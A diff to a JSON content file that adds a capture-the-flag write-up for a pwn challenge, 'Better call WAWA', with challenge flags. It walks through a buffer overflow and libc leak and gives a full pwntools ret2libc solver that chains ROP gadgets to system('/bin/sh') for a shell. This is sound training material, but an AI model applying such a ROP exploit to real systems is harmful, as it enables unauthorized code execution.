@@ -64,6 +64,33 @@
       "role": "player",
       "flag": "Securinets{0n3_l34k_0n3_sh0t_z3r0_w4nt3d_st4rs}",
       "fhide": true
+     },
+     "test": {
+      "type": "file",
+      "title": "Better call WAWA.md",
+      "date": "2026-10-03",
+      "category": "pwn",
+      "pts": "200",
+      "body": "This is a classic ret2libc challenge just a friendly little binary that hands us a libc leak on a silver platter and then lets us smash the stack. If you've done a few pwn challenges before, this one should feel right at home. Let's dive in. \n\nwe are provided with an excutable binary that when executed give us an adress and asks for input :\n\n![image](img:imusiiok01z1)\n\nlooking at the adress provided we can tell it's a libc leaked adress. so maybe we will need this adress to return to libc and open a shell. \nLet's continue and see the binary's security :\n\n![image](img:imusiknfg8jm)\n\nInterestring , no pie nor canary so maybe we're doing a buffer overflow and returning to libc ?\n\nMaybe debugging the binary using gdb gives us and idea about what's happening to our input. \n\n![image](img:imusimnomy4o)\n\nAs seen here the core function of our program is \"answer_wawa\" function. Let's disassemble it and see if there is a vulnerability in it (also there is no function that gives us the flag like win  so from here we knew that we need to get a shell): \n\n![image](img:imusiphvbzhu)\n \nWe can clearly notice a buffer overflow here as read size is **0x48** (72 bytes) while the stack allocated **32** bytes (sub  rsp, 0x20)\nNow we will see how far is our input from the return adress so we know how much padding we need. \n![image](img:imusiu7i4cff)\ni've sent many A's so i can track my input in the stack then i knew that saved rip is at** 0x7fffffffdba8 **(u can know that by typing **info frame** in gdb) \n\n![image](img:imusiw651hs3)\n\nsubtracting the adresses we get our padding size which is 40 bytes . \nWhats left now is to know to which funtion in libc the adress leaked belong to, and that's simple (because pie is disabled so the adress is the same for every run)  :\n\n![image](img:imusiyuz6767)\n\ni just inspected the parameter passed to printf that prints the adress and i knew it belongs to **_IO_2_1_stdout_**. now we can make our solver : \n\n\n```python\n#!/usr/bin/env python3\nfrom pwn import *\n\n# --- Setup ---\ncontext.binary = ELF(\"./main\", checksec=False)\ncontext.log_level = \"error\"\nlibc = ELF(\"./libc.so.6\", checksec=False)\np=process(\"./main\")\n\n\n# --- Stage 1: Leak libc via the printf'd stdout pointer ---\np.recvuntil(b\"WAWA'S LINE: \")\nleak = int(p.recvline().strip(), 16)\nlibc.address = leak - libc.sym[\"_IO_2_1_stdout_\"]\nlog.info(f\"libc base: {hex(libc.address)}\")\n\n# --- Stage 2: Build ROP chain ---\nrop     = ROP(libc)\nret     = rop.find_gadget([\"ret\"]).address\npop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\nbin_sh  = next(libc.search(b\"/bin/sh\\x00\"))\n\nlog.info(f\"ret     = {hex(ret)}\")\nlog.info(f\"pop_rdi = {hex(pop_rdi)}\")\nlog.info(f\"bin_sh  = {hex(bin_sh)}\")\n\n# --- Stage 3: Overflow buffer and hijack return address ---\npayload  = b\"A\" * 40          # padding up to saved RIP\npayload += p64(ret)           # stack alignment for system()\npayload += p64(pop_rdi)       # pop rdi ; ret\npayload += p64(bin_sh)        # rdi = \"/bin/sh\"\npayload += p64(libc.sym.system)\n\np.sendafter(b\"message:\\n\", payload)\n\n# --- Stage 4: Grab the flag ---\np.interactive()\n\n```\n\n![image](img:imusj56hl9aj)\n\nBingo u got ur shell, u need to just run cat flag.txt \n\n",
+      "imgs": {
+       "imusiiok01z1": "images/c861c7a9f9c2ead2.jpg",
+       "imusiknfg8jm": "images/3f90ae631bbf2737.jpg",
+       "imusimnomy4o": "images/1f75ef0f4fc3964f.jpg",
+       "imusiphvbzhu": "images/4c388898fe37753d.jpg",
+       "imusiu7i4cff": "images/45455c0d475ef95a.jpg",
+       "imusiw651hs3": "images/5edff259c2ff5366.jpg",
+       "imusiyuz6767": "images/e7b6ebdb3d76a899.jpg",
+       "imusj56hl9aj": "images/ab045d86134159be.jpg"
+      },
+      "flag": "Securinets{B3TT3R_C4LL_W4W4_6G_YALLLA}",
+      "fhide": true,
+      "flagLabel": "Flag.txt",
+      "flagColor": "blue",
+      "tags": [
+       "Rop",
+       "buffer overflow"
+      ],
+      "role": "player"
      }
     }
    }
